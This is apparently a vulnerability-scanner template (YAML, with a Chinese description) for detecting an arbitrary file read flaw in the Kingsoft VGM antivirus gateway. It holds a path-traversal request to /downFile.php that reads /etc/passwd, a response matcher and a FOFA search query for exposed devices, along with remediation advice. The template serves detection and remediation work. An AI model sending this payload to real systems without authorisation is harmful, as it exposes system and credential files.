id: kingsoft-vgm-lfi

info:
  name: Kingsoft VGM Antivirus - 任意文件读取漏洞
  author: abbas.heybati
  severity: high
  description: |
    该模板用于检测 Kingsoft VGM Antivirus - 任意文件读取漏洞。该类漏洞通常源于文件路径、下载参数或资源加载接口缺少目录穿越和权限校验，导致任意文件被读取或包含。模板会向 `/downFile.php?filename=../../../../etc/passwd` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可读取配置文件、源码、日志、密钥或系统敏感文件。
    - 若文件包含点可被利用，可能进一步造成代码执行、凭据泄露或对内部系统的持续入侵。
  remediation: |
    - 对文件访问参数使用固定映射或白名单，禁止直接使用用户输入拼接文件路径。
    - 规范化并校验最终路径，阻断 `../`、编码绕过和绝对路径访问。
    - 限制应用进程的文件系统权限，避免配置、密钥和日志被 Web 服务账号读取。
  reference:
    - https://mp.weixin.qq.com/s?__biz=MzkyMjE3MjEyNQ==&mid=2247486073&idx=1&sn=8e61e162262585bb8ce973b61df989b4&chksm=c1f925cbf68eacddfe441b8f1861e88068039712e467fb9bbe91eae31d439286c7147d197b07
    - https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/kongsoft-vgm-antivirus-wall-rce.yaml
  classification:
    cpe: cpe:2.3:a:kingsoft:kingsoft_antivirus:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: kingsoft
    product: kingsoft_antivirus
    fofa-query: title="金山VGM防毒墙"
  tags: kingsoft,vgm,lfi,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/downFile.php?filename=../../../../etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

      - type: word
        part: header
        words:
          - "application/force-download"

      - type: status
        status:
          - 200
